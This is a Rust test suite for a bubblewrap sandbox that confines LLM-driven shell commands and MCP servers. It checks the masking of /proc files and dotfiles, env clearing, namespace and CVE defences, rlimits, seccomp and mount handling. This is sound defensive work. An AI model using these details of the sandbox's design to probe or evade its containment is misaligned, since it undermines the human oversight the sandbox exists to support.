                std::path::Path::new("/tmp/.sandbox_passwd"),
                std::path::Path::new("/tmp/.sandbox_group"),
                std::path::Path::new("/tmp/.sandbox_empty"),
                None,
                &fake_limits(),
                &[],
                None,
            )
        };

        // 1) No caller-injected binds → no `/lit` anywhere (the inline block is
        //    gone, not resurrected).
        let bare = build(&fake_ctx());
        assert!(
            !bare.iter().any(|a| a == "/lit"),
            "an empty extra_ro_binds must emit no /lit bind: {bare:?}"
        );

        // 2) Caller injects the exact (host_view, /lit) pair the ziee handler
        //    computes → emitted as `--ro-bind-try <host_view> /lit`, contiguous.
        let mut ctx = fake_ctx();
        let host_view = "/data/lit-cache/view/conv-abc".to_string();
        ctx.extra_ro_binds = vec![(host_view.clone(), "/lit".to_string())];
        let with_lit = build(&ctx);
        let pos = with_lit
            .iter()
            .position(|a| a == "/lit")
            .expect("/lit must be present when injected");
        assert_eq!(with_lit[pos - 2], "--ro-bind-try", "flag byte-identical to the old inline emit");
        assert_eq!(with_lit[pos - 1], host_view, "host source byte-identical");

        // 3) The injected bind lands AFTER the /proc masks (i.e. in the
        //    extra_ro_binds loop) and BEFORE the prlimit tail — the exact slot
        //    the inline `all_ro_binds.push` occupied.
        let masks_end = with_lit
            .iter()
            .rposition(|a| a == "/proc/kmsg")
            .expect("proc masks present");
        let prlimit = with_lit
            .iter()
            .position(|a| a == "/usr/bin/prlimit")
            .expect("prlimit present");
        assert!(masks_end < pos && pos < prlimit, "/lit in the caller-supplied RO-bind slot");

        // 4) The ONLY delta between bare and with-lit is the three injected
        //    tokens — everything else in the argv is byte-for-byte identical.
        let mut stripped = with_lit.clone();
        for _ in 0..3 {
            stripped.remove(pos - 2);
        }
        assert_eq!(stripped, bare, "argv is byte-identical apart from the injected bind triple");
    }

    #[test]
    fn argv_uses_dev_bind_proc_in_fallback_mode() {
        let mut caps = fake_caps();
        caps.pid_namespace = PidNsMode::DevBindFallback;
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );
        // Must use --dev-bind /proc /proc, NOT --proc /proc.
        assert!(argv.windows(3).any(|w| w == ["--dev-bind", "/proc", "/proc"]));
        assert!(!argv.windows(2).any(|w| w == ["--proc", "/proc"]));
        assert!(!argv.iter().any(|a| a == "--unshare-pid"));
        // SECURITY/CORRECTNESS regression: --as-pid-1 MUST NOT appear in
        // DevBindFallback mode — bwrap rejects it without --unshare-pid,
        // which would cause every sandboxed call to fail with exit=1
        // and a misleading "Specifying --as-pid-1 requires --unshare-pid"
        // message in stderr.
        assert!(
            !argv.iter().any(|a| a == "--as-pid-1"),
            "--as-pid-1 must be gated on --unshare-pid (Strict mode only)"
        );
    }

    #[test]
    fn argv_uses_strict_proc_when_pid_ns_strict() {
        let caps = fake_caps(); // PidNsMode::Strict
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );
        assert!(argv.iter().any(|a| a == "--unshare-pid"));
        assert!(argv.windows(2).any(|w| w == ["--proc", "/proc"]));
        // Strict mode IS allowed to use --as-pid-1 (and we do).
        assert!(argv.iter().any(|a| a == "--as-pid-1"));
    }

    #[test]
    fn argv_masks_dangerous_proc_files() {
        // G2: /proc/{sysrq-trigger,kcore,kallsyms,kmsg} must be masked over
        // /dev/null in every mode (critical in DevBindFallback, defense in
        // depth in Strict). Regression guard against silently dropping a mask.
        for mode in [PidNsMode::Strict, PidNsMode::DevBindFallback] {
            let mut caps = fake_caps();
            caps.pid_namespace = mode;
            let state = fake_state();
            let ctx = fake_ctx();
            let argv = build_bwrap_argv(
                &caps,
                &state.workspace_root,
                &ctx,
                std::path::Path::new(state.config.rootfs_path()),
                "x",
                std::path::Path::new("/tmp/.sandbox_passwd"),
                std::path::Path::new("/tmp/.sandbox_group"),
                std::path::Path::new("/tmp/.sandbox_empty"),
                None,
                &fake_limits(),
                &[],
                None,
            );
            for masked in ["/proc/sysrq-trigger", "/proc/kcore", "/proc/kallsyms", "/proc/kmsg"] {
                assert!(
                    argv.windows(3).any(|w| w == ["--ro-bind", "/dev/null", masked]),
                    "mode {mode:?}: must mask {masked} with --ro-bind /dev/null; argv: {argv:?}"
                );
            }
        }
    }

    #[test]
    fn argv_masks_dangerous_dotfiles_at_workspace_root() {
        // Mirrors Anthropic sandbox-runtime's DANGEROUS_FILES protection
        // (sandbox-utils.ts:11-22). Every entry in DANGEROUS_DOTFILES must
        // appear as `--ro-bind /dev/null /home/sandboxuser/<name>` in the argv
        // so an LLM-driven command can neither read the file (sees empty) nor
        // create / overwrite it (EROFS).
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );
        // The bind source is the empty-regular-file passed in (NOT /dev/null —
        // that's a char device on a `nodev` mount, which bash's `open()`
        // refuses with EACCES; see `build_bwrap_argv::mask_path` doc).
        for dotfile in DANGEROUS_DOTFILES {
            let expected = format!("/home/sandboxuser/{dotfile}");
            assert!(
                argv.windows(3)
                    .any(|w| w == ["--ro-bind", "/tmp/.sandbox_empty", expected.as_str()]),
                "must mask {dotfile} with --ro-bind /tmp/.sandbox_empty; argv: {argv:?}"
            );
        }
    }

    /// Build a `SandboxContext` whose `files` Arc holds the given list,
    /// reusing the other field values from `fake_ctx()` (which hard-codes
    /// an EMPTY file list, so it can't exercise the collision loop).
    fn ctx_with_files(files: Vec<ConversationFile>) -> SandboxContext {
        SandboxContext {
            files: Arc::new(files),
            ..fake_ctx()
        }
    }

    /// One `ConversationFile` with the given filename. file_id is fresh
    /// (the collision-suffixing keys on filename, not file_id).
    fn cfile(filename: &str) -> ConversationFile {
        let id = Uuid::new_v4();
        ConversationFile {
            file_id: id,
            blob_version_id: id,
            version: 1,
            version_id: id,
            filename: filename.to_string(),
            user_id: Uuid::nil(),
            mime_type: None,
            created_at: chrono::Utc::now(),
        }
    }

    /// Two attachments sharing a filename must NOT both bind to
    /// `/home/sandboxuser/data.csv` (the later would shadow the earlier).
    /// The collision loop suffixes " (2)" before the extension, so the
    /// second binds to `/home/sandboxuser/data (2).csv`. Both binds must
    /// be present.
    #[test]
    fn argv_suffixes_duplicate_attachment_filenames() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = ctx_with_files(vec![cfile("data.csv"), cfile("data.csv")]);
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );

        // Attachments emit `--ro-bind-try <host> /home/sandboxuser/<dest>`.
        let dests: Vec<&str> = argv
            .windows(3)
            .filter(|w| w[0] == "--ro-bind-try")
            .map(|w| w[2].as_str())
            .collect();
        assert!(
            dests.contains(&"/home/sandboxuser/data.csv"),
            "first attachment keeps its name; dests: {dests:?}"
        );
        assert!(
            dests.contains(&"/home/sandboxuser/data (2).csv"),
            "the duplicate must be suffixed BEFORE the extension; dests: {dests:?}"
        );
    }

    /// Dotless duplicate filenames pin the no-extension branch of the
    /// collision loop: two `Makefile`s map to `Makefile` and
    /// `Makefile (2)` (suffix appended at the end — there is no extension
    /// to insert it before).
    #[test]
    fn argv_suffixes_duplicate_dotless_filenames() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = ctx_with_files(vec![cfile("Makefile"), cfile("Makefile")]);
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );

        let dests: Vec<&str> = argv
            .windows(3)
            .filter(|w| w[0] == "--ro-bind-try")
            .map(|w| w[2].as_str())
            .collect();
        assert!(
            dests.contains(&"/home/sandboxuser/Makefile"),
            "first dotless attachment keeps its name; dests: {dests:?}"
        );
        assert!(
            dests.contains(&"/home/sandboxuser/Makefile (2)"),
            "the dotless duplicate suffixes at the end; dests: {dests:?}"
        );
    }

    /// Phase 3 regression test: every security-critical flag must
    /// appear in the production argv. If anyone removes one, this
    /// test fails — preventing silent hardening regressions.
    #[test]
    fn argv_includes_all_security_critical_flags() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "echo hi",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );

        let must_have = [
            "--clearenv",        // env-var exfiltration defense
            "--unshare-user",    // user-namespace isolation
            "--unshare-uts",     // hostname isolation
            "--unshare-ipc",     // IPC isolation
            "--die-with-parent", // child dies on bwrap kill
            "--new-session",     // CVE-2017-5226 / TIOCSTI defense
            "--",                // CVE-2024-32462 arg-injection defense
            "/usr/bin/prlimit",  // rlimit wrapper applied to user code
            "/bin/bash",         // shell (specifically bash, NOT sh)
        ];
        for flag in &must_have {
            assert!(
                argv.iter().any(|a| a == flag),
                "production bwrap argv MUST include {flag}; full argv: {argv:?}"
            );
        }

        // Per-call rlimits must follow prlimit in order.
        let prlimit_idx = argv
            .iter()
            .position(|a| a == "/usr/bin/prlimit")
            .expect("prlimit not found");
        let rlimit_flags = [
            "--nproc=256",
            "--core=0",
            "--nofile=1024",
        ];
        for flag in &rlimit_flags {
            assert!(
                argv[prlimit_idx..].iter().any(|a| a == flag),
                "rlimit flag {flag} missing after prlimit; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn argv_includes_seccomp_fd_only_when_provided() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv_without = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );
        assert!(!argv_without.iter().any(|a| a == "--seccomp"));

        let argv_with = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            Some(7),
            &fake_limits(),
            &[],
            None,
        );
        assert!(argv_with.windows(2).any(|w| w == ["--seccomp", "7"]));
    }

    #[test]
    fn argv_workflow_extra_mounts_emit_ro_and_rw_binds() {
        // B4 — `build_bwrap_argv` honors per-call `StagedMount` entries:
        // ReadOnly → `--ro-bind`, ReadWrite → `--bind`. Existing security
        // flags (`--clearenv`, `--unshare-user`, seccomp, prlimit) must
        // continue to ship.
        use crate::workflow_staging::{StageMode, StagedMount};
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let mounts = vec![
            StagedMount {
                mode: StageMode::ReadOnly,
                host_path: PathBuf::from("/host/workflow"),
                sandbox_path: "/home/sandboxuser/workflow/run-1".to_string(),
            },
            StagedMount {
                mode: StageMode::ReadWrite,
                host_path: PathBuf::from("/host/artifacts"),
                sandbox_path: "/home/sandboxuser/workflow/run-1/artifacts/step1".to_string(),
            },
        ];
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &mounts,
            None,
        );
        // ReadOnly → `--ro-bind-try` window.
        assert!(
            argv.windows(3).any(|w| w[0] == "--ro-bind-try"
                && w[1] == "/host/workflow"
                && w[2] == "/home/sandboxuser/workflow/run-1"),
            "RO mount missing; argv: {argv:?}"
        );
        // ReadWrite → `--bind` window.
        assert!(
            argv.windows(3).any(|w| w[0] == "--bind"
                && w[1] == "/host/artifacts"
                && w[2] == "/home/sandboxuser/workflow/run-1/artifacts/step1"),
            "RW mount missing; argv: {argv:?}"
        );
        // Security guarantees still ship.
        for required in &["--clearenv", "--unshare-user", "--die-with-parent", "/usr/bin/prlimit"] {
            assert!(
                argv.iter().any(|a| a == required),
                "missing security flag {required}; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn argv_with_no_extra_mounts_is_byte_identical_to_empty_slice() {
        // Defense: passing `&[]` must not emit any extra --ro-bind /
        // --bind beyond the existing attachment binds.
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );
        // No --bind for `/home/sandboxuser/workflow/*` (the workflow
        // namespace). The base `--bind workspace /home/sandboxuser`
        // still ships from the hardening prefix.
        assert!(
            !argv
                .windows(3)
                .any(|w| w[0] == "--bind"
                    && w[2].starts_with("/home/sandboxuser/workflow/")),
            "no workflow mounts requested but found one; argv: {argv:?}"
        );
    }

    #[test]
    fn argv_prlimit_carries_expected_flags() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );
        let s = argv.join(" ");
        assert!(s.contains("/usr/bin/prlimit"));
        assert!(s.contains("--nproc=256"));
        assert!(s.contains("--core=0"));
        assert!(s.contains("--fsize="));
        assert!(s.contains("--as="));
    }

    #[test]
    fn output_cap_is_one_mib() {
        assert_eq!(OUTPUT_CAP_BYTES, 1024 * 1024);
    }

    #[tokio::test]
    async fn read_capped_truncates_at_one_mib() {
        // 2 MiB of bytes through the reader; expect exactly 1 MiB out.
        let big = vec![b'X'; 2 * 1024 * 1024];
        let cursor = std::io::Cursor::new(big);
        let (buf, truncated) = read_capped_owned(cursor).await;
        assert_eq!(buf.len(), OUTPUT_CAP_BYTES);
        assert!(truncated);
    }

    #[tokio::test]
    async fn read_capped_passes_through_short_output() {
        let cursor = std::io::Cursor::new(b"hello".to_vec());
        let (buf, truncated) = read_capped_owned(cursor).await;
        assert_eq!(&buf, b"hello");
        assert!(!truncated);
    }

    // ===================================================================
    // build_mcp_sandbox_argv — long-lived stdio MCP path
    // ===================================================================

    fn fake_mcp_params<'a>(
        caps: &'a HardeningCapabilities,
        rootfs: &'a Path,
        passwd: &'a Path,
        group: &'a Path,
        mask: &'a Path,
        home: &'a Path,
        env: &'a [(String, String)],
        binds: &'a [(String, String)],
    ) -> HardeningArgvParams<'a> {
        HardeningArgvParams {
            caps,
            rootfs_dir: rootfs,
            passwd_path: passwd,
            group_path: group,
            mask_path: mask,
            home_bind_source: home,
            seccomp_fd: None,
            extra_setenv: env,
            extra_ro_binds: binds,
            extra_rw_binds: &[],
            progress_fifo_src: None,
        }
    }

    #[test]
    fn mcp_argv_is_direct_exec_no_bash_lc() {
        // The MCP path MUST NOT wrap the command in `bash -lc` — rmcp
        // pipes JSON-RPC bytes straight through bwrap into the MCP
        // server's stdin/stdout. A shell layer would corrupt that
        // byte stream (interpret control bytes, re-source dotfiles,
        // etc.).
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/tmp/mcp-home");
        let env: Vec<(String, String)> = vec![];
        let binds: Vec<(String, String)> = vec![];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/opt/embedded/bun"),
            &["x".to_string(), "@modelcontextprotocol/server-everything".to_string()],
            &fake_limits(),
        );
        assert!(!argv.iter().any(|a| a == "/bin/bash"));
        assert!(!argv.iter().any(|a| a == "-lc"));
        // Last meaningful tokens should be the resolved command + args.
        assert_eq!(argv[argv.len() - 3], "/opt/embedded/bun");
        assert_eq!(argv[argv.len() - 2], "x");
        assert_eq!(argv[argv.len() - 1], "@modelcontextprotocol/server-everything");
    }

    #[test]
    fn mcp_argv_keeps_security_critical_flags() {
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/tmp/mcp-home");
        let env: Vec<(String, String)> = vec![];
        let binds: Vec<(String, String)> = vec![];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/usr/bin/python3"),
            &["-m".to_string(), "echo".to_string()],
            &fake_limits(),
        );
        for required in &[
            "--clearenv",
            "--unshare-user",
            "--unshare-uts",
            "--unshare-ipc",
            "--share-net",
            "--new-session",
            "--die-with-parent",
            "--",
            "/usr/bin/prlimit",
        ] {
            assert!(
                argv.iter().any(|a| a == required),
                "missing flag {required}; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn mcp_argv_injects_extra_setenv_after_clearenv() {
        // BLOCKED_ENV_VARS filtering happens at the stdio.rs call
        // site; here we trust the caller. The argv builder MUST place
        // the extra --setenv entries AFTER --clearenv (and after the
        // hard-coded HOME/USER/PATH block, by virtue of insertion
        // order in build_hardening_prefix) so they survive into the
        // sandbox.
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/tmp/mcp-home");
        let env = vec![
            ("MCP_API_KEY".to_string(), "abc123".to_string()),
            ("FOO".to_string(), "bar".to_string()),
        ];
        let binds: Vec<(String, String)> = vec![];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/usr/bin/python3"),
            &[],
            &fake_limits(),
        );
        let clearenv_idx = argv.iter().position(|a| a == "--clearenv").unwrap();
        // Look for the windows ["--setenv", "MCP_API_KEY", "abc123"] and
        // ["--setenv", "FOO", "bar"] anywhere after --clearenv.
        for (key, val) in &[("MCP_API_KEY", "abc123"), ("FOO", "bar")] {
            let pos = argv
                .windows(3)
                .position(|w| w[0] == "--setenv" && &w[1] == key && &w[2] == val)
                .unwrap_or_else(|| panic!("missing --setenv for {key}; argv: {argv:?}"));
            assert!(pos > clearenv_idx, "--setenv {key} must come after --clearenv");
        }
    }

    #[test]
    fn mcp_argv_emits_extra_ro_binds() {
        // The embedded-binary bind for uv/bun lands here. Test that
        // an arbitrary extra_ro_binds entry shows up as
        // [`--ro-bind-try`, host, sandbox].
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/tmp/mcp-home");
        let env: Vec<(String, String)> = vec![];
        let binds = vec![(
            "/Users/admin/.ziee/bin".to_string(),
            "/Users/admin/.ziee/bin".to_string(),
        )];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/Users/admin/.ziee/bin/bun"),
            &["x".to_string()],
            &fake_limits(),
        );
        let found = argv.windows(3).any(|w| {
            w[0] == "--ro-bind-try"
                && w[1] == "/Users/admin/.ziee/bin"
                && w[2] == "/Users/admin/.ziee/bin"
        });
        assert!(found, "missing extra ro-bind window; argv: {argv:?}");
    }

    #[test]
    fn mcp_argv_homes_at_per_server_workspace() {
        let caps = fake_caps();
        let rootfs = PathBuf::from("/opt/rootfs");
        let passwd = PathBuf::from("/tmp/p");
        let group = PathBuf::from("/tmp/g");
        let mask = PathBuf::from("/tmp/m");
        let home = PathBuf::from("/var/lib/ziee/sandboxes/mcp/abcd");
        let env: Vec<(String, String)> = vec![];
        let binds: Vec<(String, String)> = vec![];
        let p = fake_mcp_params(&caps, &rootfs, &passwd, &group, &mask, &home, &env, &binds);
        let argv = build_mcp_sandbox_argv(
            &p,
            std::path::Path::new("/bin/echo"),
            &["hi".to_string()],
            &fake_limits(),
        );
        let bind_idx = argv
            .windows(3)
            .position(|w| {
                w[0] == "--bind"
                    && w[1] == "/var/lib/ziee/sandboxes/mcp/abcd"
                    && w[2] == "/home/sandboxuser"
            })
            .expect("home bind not found");
        // Confirm --chdir /home/sandboxuser follows shortly.
        assert!(argv[bind_idx..]
            .windows(2)
            .any(|w| w[0] == "--chdir" && w[1] == "/home/sandboxuser"));
    }

    // TEST-3 [acceptance INV-2]: the seccomp-write classifier distinguishes a
    // routine child-exited-early EPIPE (logged quietly, not a bypass) from a
    // genuine truncation (stays loud) — and never mislabels a genuine
    // truncation as ChildGone (the trap the fix must not fall into).
    #[cfg(target_os = "linux")]
    #[test]
    fn classify_seccomp_write_splits_epipe_from_genuine_truncation() {
        // Full write → Complete, regardless of any stale errno.
        assert_eq!(
            classify_seccomp_write(560, 560, None),
            SeccompWriteOutcome::Complete
        );
        assert_eq!(
            classify_seccomp_write(560, 560, Some(libc::EPIPE)),
            SeccompWriteOutcome::Complete
        );

        // Short write because the reader (bwrap child) went away → ChildGone.
        // This is the ~204×/day case: written=0, expected=560, errno=32 (EPIPE).
        assert_eq!(
            classify_seccomp_write(0, 560, Some(libc::EPIPE)),
            SeccompWriteOutcome::ChildGone
        );
        assert_eq!(
            classify_seccomp_write(120, 560, Some(libc::EPIPE)),
            SeccompWriteOutcome::ChildGone
        );

        // Short write from any OTHER cause → Truncated (real hardening failure,
        // stays loud). A non-EPIPE errno and an unexpected EOF (write returned 0
        // with no recorded errno) must BOTH be Truncated, never ChildGone.
        assert_eq!(
            classify_seccomp_write(300, 560, Some(libc::EIO)),
            SeccompWriteOutcome::Truncated
        );
        assert_eq!(
            classify_seccomp_write(0, 560, None),
            SeccompWriteOutcome::Truncated
        );
        assert_ne!(
            classify_seccomp_write(300, 560, Some(libc::EIO)),
            SeccompWriteOutcome::ChildGone,
            "a genuine (non-EPIPE) truncation must NOT be quieted as ChildGone"
        );
    }
}
